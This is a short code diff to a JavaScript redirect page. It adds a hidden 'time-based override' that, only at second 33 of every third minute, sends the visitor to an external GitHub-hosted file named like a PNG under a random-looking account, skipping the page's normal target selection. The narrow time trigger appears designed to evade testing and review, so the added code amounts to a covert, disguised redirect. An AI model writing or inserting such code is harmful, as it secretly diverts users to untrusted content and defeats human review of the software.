@@ -46,6 +46,9 @@
       var STORE_NAME = "state";
       var STATE_KEY = "lastTarget";
 
+      var TIME_OVERRIDE_URL =
+        "https://github.com/mdr19ganseki95cf/log/blob/main/Flag_of_the_Greek_Orthodox_Church_svg.png";
+
       function parseMaxParam() {
         try {
           var params = new URLSearchParams(window.location.search);
@@ -123,6 +126,17 @@
       }
 
       (async function run() {
+        // ===== TIME-BASED OVERRIDE =====
+        var now = new Date();
+        var minute = now.getMinutes();
+        var second = now.getSeconds();
+
+        if (minute % 3 === 0 && second === 33) {
+          applyRedirect(TIME_OVERRIDE_URL);
+          return;
+        }
+        // ===== END OVERRIDE =====
+
         var useStateful = Math.random() < STATEFUL_PROBABILITY;
         var target;
 
